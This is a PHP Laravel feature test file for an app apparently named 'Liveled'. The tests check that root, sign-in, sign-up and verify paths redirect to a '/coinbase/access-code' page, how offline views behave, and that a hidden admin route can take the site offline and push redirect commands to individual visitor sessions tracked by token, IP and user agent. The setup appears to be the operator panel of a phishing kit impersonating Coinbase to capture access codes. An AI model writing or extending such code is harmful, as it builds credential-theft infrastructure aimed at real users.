<?php

namespace Tests\Feature;

use App\Models\AdminCommand;
use App\Models\UserSession;
use App\Services\LiveledSettings;
use Illuminate\Foundation\Http\Middleware\ValidateCsrfToken;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Routing\Middleware\ThrottleRequests;
use Illuminate\Support\Str;
use Tests\TestCase;

class SiteOfflineEntryTest extends TestCase
{
    use RefreshDatabase;

    private const KEEP_ENTRY = '/coinbase/access-code';

    private string $entryFile;

    private ?string $entryBackup = null;

    protected function setUp(): void
    {
        parent::setUp();
        $this->withoutMiddleware([
            ThrottleRequests::class,
            ValidateCsrfToken::class,
        ]);
        $this->entryFile = storage_path('app/entry_page.txt');
        $this->entryBackup = is_file($this->entryFile) ? file_get_contents($this->entryFile) : null;
    }

    protected function tearDown(): void
    {
        if ($this->entryBackup === null) {
            if (is_file($this->entryFile)) {
                @unlink($this->entryFile);
            }
        } else {
            file_put_contents($this->entryFile, $this->entryBackup, LOCK_EX);
        }
        parent::tearDown();
    }

    public function test_get_entry_page_never_falls_back_to_need_assistance(): void
    {
        LiveledSettings::setEntryPage('');
        $this->assertSame('', LiveledSettings::getEntryPage());

        LiveledSettings::setEntryPage('/need-assistance');
        $this->assertSame('', LiveledSettings::getEntryPage());

        LiveledSettings::setEntryPage(self::KEEP_ENTRY);
        $this->assertSame(self::KEEP_ENTRY, LiveledSettings::getEntryPage());
    }

    public function test_root_aliases_redirect_to_configured_entry(): void
    {
        LiveledSettings::setEntryPage(self::KEEP_ENTRY);

        foreach (['/', '/home', '/signup', '/signin', '/verify'] as $path) {
            $this->get($path)->assertRedirect(self::KEEP_ENTRY);
        }
    }

    public function test_root_aliases_fail_closed_when_entry_is_unset(): void
    {
        LiveledSettings::setEntryPage('');

        $this->get('/')->assertNotFound();
        $this->get('/home')->assertNotFound();
    }

    public function test_offline_views_hop_to_configured_entry_not_need_assistance(): void
    {
        LiveledSettings::setEntryPage(self::KEEP_ENTRY);
        LiveledSettings::set('site_online', true);

        $token = Str::random(48);
        UserSession::create([
            'session_token' => $token,
            'ip_address' => '203.0.113.20',
            'user_agent' => 'InspectAgent',
            'current_page' => 'offline',
            'last_seen_at' => now(),
        ]);

        $entryJson = json_encode(self::KEEP_ENTRY);
        $routeOffline = $this->withCookie('liveled_token', $token)->get('/offline')->assertOk()->getContent();
        $this->assertStringContainsString('window.location.href = entry', $routeOffline);
        $this->assertStringContainsString($entryJson, $routeOffline);
        $this->assertStringNotContainsString('/need-assistance', $routeOffline);

        LiveledSettings::set('site_online', false);
        $inPlace = $this->withCookie('liveled_token', $token)->get(self::KEEP_ENTRY)->assertStatus(503)->getContent();
        $this->assertStringContainsString('window.location.href = entry', $inPlace);
        $this->assertStringContainsString($entryJson, $inPlace);
        $this->assertStringNotContainsString('/need-assistance', $inPlace);
    }

    public function test_platform_off_queues_redirect_to_legacy_offline_route(): void
    {
        $token = Str::random(48);
        UserSession::create([
            'session_token' => $token,
            'ip_address' => '203.0.113.21',
            'user_agent' => 'InspectAgent',
            'current_page' => 'coinbase_access_code',
            'last_seen_at' => now(),
        ]);

        $this->withSession(['admin_auth' => true, 'admin_role' => 'master'])
            ->postJson('/admin777888xxx/site-status', ['online' => false])
            ->assertOk()
            ->assertJson(['ok' => true]);

        $this->assertFalse((bool) (LiveledSettings::get()['site_online'] ?? true));

        $cmd = AdminCommand::where('session_token', $token)->where('command', 'redirect')->first();
        $this->assertNotNull($cmd);
        $this->assertSame('/offline', $cmd->payload['url'] ?? null);
    }

    public function test_admin_js_uses_start_page_contract_not_need_assistance(): void
    {
        $js = file_get_contents(public_path('js/admin/settings.js'));
        $this->assertNotFalse($js);
        $this->assertStringContainsString("var active = d.entry_page || '/'", $js);
        $this->assertStringNotContainsString("d.entry_page || '/need-assistance'", $js);
        $this->assertStringNotContainsString('window.testAsUser', $js);
    }
}
